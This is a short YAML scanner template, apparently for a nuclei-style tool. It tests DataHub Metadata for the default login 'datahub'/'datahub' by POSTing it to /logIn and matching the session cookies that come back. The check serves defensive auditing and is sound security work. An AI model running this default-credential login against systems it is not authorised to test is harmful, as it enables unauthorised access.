id: poc-yaml-datahub-metadata-weak-password
info:
  name: DataHub Metadata Weak Password
  author: ProjectDiscoveryAI
  severity: high
  tags: weak-password,datahub
http:
  - method: POST
    path:
      - "{{BaseURL}}/logIn"
    headers:
      Content-Type: application/json
    body: |-
      {"username":"datahub","password":"datahub"}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: header
        words:
          - "Set-Cookie: actor=urn:li:corpuser:datahub;"
          - "PLAY_SESSION="
      - type: word
        part: body
        words:
          - ""
